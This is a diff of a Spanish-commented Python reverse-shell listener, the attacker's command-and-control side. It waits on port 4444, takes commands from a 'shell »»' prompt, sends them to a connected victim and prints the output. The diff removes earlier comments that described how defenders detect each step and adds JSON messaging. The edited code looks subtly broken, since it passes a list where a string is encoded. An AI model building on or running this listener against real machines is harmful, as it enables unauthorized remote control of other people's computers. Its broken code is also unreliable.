@@ -5,98 +5,50 @@
 # ADVERTENCIA: Solo usar en laboratorio aislado propio
 # =============================================================================
 
-import socket # │ IMPORTACIÓN DE LIBRERÍAS
-
-    # socket     → Comunicaciones de red (crear sockets, enviar/recibir datos)
-
-    # 🛡️ DETECCIÓN: EDRs monitorean este import como posible C2
-    # 🛡️ MANJARO: sudo journalctl | grep -i "python"
+import socket,json # │ IMPORTACIÓN DE LIBRERÍAS
 
 class Listener:
 
     def __init__(self, ip, port):
        
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # │ CREACIÓN DEL SOCKET
-            
-            # socket.socket() → Crea un endpoint de comunicación de red
-            # AF_INET         → Familia de direcciones IPv4 (ej: 192.168.1.39)
-            # SOCK_STREAM     → Protocolo TCP (orientado a conexión, confiable)
-
-            # 🛡️ DETECCIÓN: Esta combinación (TCP + IPv4) es común en malware C2
-            # 🛡️ COMANDO MANJARO: sudo lsof -i -P -n | grep python
-
+    
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # │ CONFIGURACIÓN DE OPCIONES DEL SOCKET 
-
-            # setsockopt()       → Configura opciones avanzadas del socket
-            # SOL_SOCKET         → Nivel de configuración (opciones generales)
-            # SO_REUSEADDR       → Permite reutilizar el puerto inmediatamente
-            # 1                  → Valor booleano (True) para activar
-
-            # 🛡️ DETECCIÓN: Esta opción es común en servidores legítimos y malware
 
         listener.bind((ip, port))  # │ ENLACE DEL PUERTO (BIND) - PUNTO DE DETECCIÓN #1 ⚠️ 
 
-            # bind()            → Asocia el socket a una IP y puerto específicos
-            # 192.168.1.39      → IP de la interfaz de red donde escuchar
-            # 4444              → Número de puerto para conexiones entrantes
-
-            # 🛡️ DETECCIÓN #1: Puerto 4444 en estado LISTEN
-            # 🛡️ COMANDO MANJARO: sudo ss -tlnp | grep 4444
-
         listener.listen(0) # │ INICIAR ESCUCHA (LISTEN)  
-
-            # listen()    → Habilita el socket para aceptar conexiones entrantes
-            # 0           → Número máximo de conexiones en cola (BACKLOG)
-
-            # 🛡️ DETECCIÓN: Socket cambia de estado a LISTEN
-            # 🛡️ COMANDO MANJARO: sudo ss -tlnp | grep python
 
         print("[+] Esperando Conexiones") # │ MENSAJE DE ESTADO - HUELLA FORENSE #1   
 
-            # print() → Muestra mensaje en la consola/terminal del atacante
-
-            # 🛡️ DETECCIÓN: Evidencia forense si se captura la terminal
 
         self.connection, address = listener.accept() # │ ACEPTAR CONEXIÓN - PUNTO DE DETECCIÓN #2 ⚠️  
-          
-            # accept()  → Bloquea hasta que una víctima se conecta
-            # connection → Nuevo socket para comunicación con la víctima
-            # address    → Tupla con (IP, Puerto) de la víctima
-
-            # 🛡️ DETECCIÓN #2: Conexión ESTABLISHED desde víctima hacia 4444
-            # 🛡️ COMANDO MANJARO: sudo netstat -antp | grep 4444
 
         print("[+] Tenemos una conexion de " + str(address)) # │ CONFIRMACIÓN DE CONEXIÓN - HUELLA FORENSE #2  
-
-            # print() → Muestra información de la víctima comprometida
-
-            # 🛡️ DETECCIÓN: La IP de la víctima queda registrada en consola
     
     def ejecutarRemoto(self,command): # │ ENVÍO DE COMANDO A LA VÍCTIMA - PUNTO DE DETECCIÓN #3 ⚠️  
 
         self.connection.send(command.encode('utf-8'))
 
-            # send()          → Envía datos a través del túnel TCP
-            # encode('utf-8') → Convierte STRING a BYTES (requerido en Python 3)
+        if command =="salir":
+            self.connection.close()
+            exit()
             
-            # 🛡️ DETECCIÓN #3: Comandos en TEXTO PLANO visibles en red
-            # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -X
+        return self.reliable_receive()
 
-        # Recibir TODA la respuesta, no solo 1024 bytes
-        result = b""
-        self.connection.settimeout(2)  # ← Timeout para saber cuándo terminar
-        
-        try:
-            while True:
-                chunk = self.connection.recv(4096)  # ← Buffer más grande
-                if not chunk:  # ← No hay más datos
-                    break
-                result += chunk
-        except socket.timeout:
-            pass  # ← Terminó de recibir
-        
-        return result
-        # Recibir TODA la respuesta, no solo 1024 bytes
+    def reliable_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode('utf-8'))
+
+    def reliable_receive(self):
+        json_data=""
+        while True:
+            try:
+                json_data = self.connection.recv(1024)
+                return json.loads(json_data.decode('utf-8'))
+            except ValueError:
+                continue
+                        
 
     def run(self): # │ BUCLE PRINCIPAL - CONTROL REMOTO ACTIVO  
 
@@ -104,25 +56,9 @@ class Listener:
  
             command = input("shell »» " ) # │ ENTRADA DE COMANDOS - HUELLA FORENSE #3 
 
-                # input()     → El atacante escribe comandos manualmente
-                # shell»»     → Prompt personalizado (firma detectable)
-                #
-                # 🛡️ DETECCIÓN: Prompt "shell»»" es firma única en logs de terminal
+            command = command.split(" ")
+            result = self.ejecutarRemoto(command)
+            print(result)
 
-            result = self.ejecutarRemoto(command) # │ RECEPCIÓN DE RESULTADOS - EXFILTRACIÓN DE DATOS ⚠️ 
-
-                # recv(1024) → Recibe hasta 1024 bytes de datos de la víctima
-                
-                # 🛡️ DETECCIÓN #4: Datos salientes desde víctima en puerto 4444
-                # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w c2.pcap
- 
-            print(result.decode('utf-8', errors='ignore')) # │ MOSTRAR RESULTADOS - HUELLA FORENSE #4 
-
-                # print()           → Muestra resultados en consola del atacante
-                # decode('utf-8')   → Convierte BYTES a STRING legible
-                # errors='ignore'   → Ignora caracteres inválidos (evita crashes)
-                
-                # 🛡️ DETECCIÓN: Evidencia forense de qué información fue comprometida
-
-escuchar=Listener("192.168.1.41",4444)
+escuchar=Listener("192.168.1.33",4444)
 escuchar.run()
